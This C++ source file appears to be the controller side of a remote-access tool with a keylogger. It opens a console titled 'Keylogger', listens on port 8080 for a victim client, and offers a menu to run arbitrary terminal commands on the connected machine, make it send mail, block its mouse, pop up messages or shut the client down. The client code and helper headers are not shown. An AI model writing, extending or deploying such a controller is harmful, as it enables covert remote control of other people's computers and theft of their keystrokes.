//SERVER

#include "server.h"
#include "serverCommand.h"
#include <Windows.h>
#include <iostream>
#include "debug.h"



void doListen(Server * server);
void doBlock(ServerCommand * cmd, int x, int y, int sec);
//using namespace std;

int main()
{
	CConsoleLoggerEx keylogger_console;
	keylogger_console.Create("Keylogger");
	//keylogger_console.cls(CConsoleLoggerEx::COLOR_BACKGROUND_BLACK);
	//keylogger_console.cprintf(CConsoleLoggerEx::COLOR_GREEN, "Hello");


	Server server(8080, "127.0.0.1", keylogger_console);
	std::thread t_listener(doListen, &server);
	t_listener.detach();
	while (!server.gotConnection)
	{
		Sleep(1000);
	}
	ServerCommand cmd(server);

int choice;
	while (server.gotConnection)
	{
		std::cout << "-----------------------------";
		std::cout << "\n1 - Terminal command." << std::endl;
		std::cout << "2 - Mail Sender." << std::endl;
		std::cout << "3 - Mouse Blocker." << std::endl;
		std::cout << "4 - Send message." << std::endl;
		std::cout << "9 - Exit Client." << std::endl;
		std::cout << "0 - Exit." << std::endl;
		std::cout << "-----------------------------\n";
		std::cin >> choice;


		switch (choice)
		{
			case 1:
			{
				std::string str;
				std::cout << "Enter a terminal command: ";
				std::cin.ignore();
					getline(std::cin, str);
					if (DEBUG)
					{
						std::cout << "Terminal command = " << str << std::endl;
					}
					cmd.sendToTerminal(str);
				break;
			}
			case 2:
			{
				std::string title, msg, address;

					std::cout << "Enter a message title: ";
					std::cin.ignore();
						getline(std::cin, title);
					std::cout << "Enter a message: ";
						getline(std::cin, msg);
					std::cout << "Enter a mail address: ";
						getline(std::cin, address);
						cmd.sendMail(address, title, msg);
				break;
			}
			case 3:
			{
				int x, y, sec;
				std::cout << "Enter cursor position X: ";
					std::cin >> x;

				std::cout << "Enter cursos position Y: ";
					std::cin >> y;

				std::cout << "How many seconds should I block mouse? ";
					std::cin >> sec;

					std::thread t_mouseblocker(doBlock, &cmd, x, y, sec);
					t_mouseblocker.detach();
				break;
			}
			case 4:
			{
				std::string title, msg;
					std::cout << "Enter a message title: ";
					std::cin.ignore();
						getline(std::cin, title);

						if(DEBUG)
							std::cout << "title = " << title << std::endl;

						std::cout << "Enter a message: ";
						getline(std::cin, msg);
						if (DEBUG)
							std::cout << "msg = " << msg << std::endl;

						cmd.sendMessage(title, msg);
				break;
			}
			case 9:
			{
				cmd.closeClient();
				server.lostConnection();
				break;
			}
			case 0:
			{
				return 0;
			}
			default:
			{
				std::cout << "Not a choice!";
				break;
			}
		}
	}
	std::cout << "Connection lost!...";
	Sleep(2000);
return 0;
}


void doListen(Server * server)
{
	if (server != NULL)
		server->listener();
}

void doBlock(ServerCommand * cmd,int x,int y,int sec)
{
	if (cmd != NULL)
		cmd->mouseBlocker(x, y, sec);
}

void gotoxy(const int x, const int y)
{
	COORD coord = { x, y };
	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);
}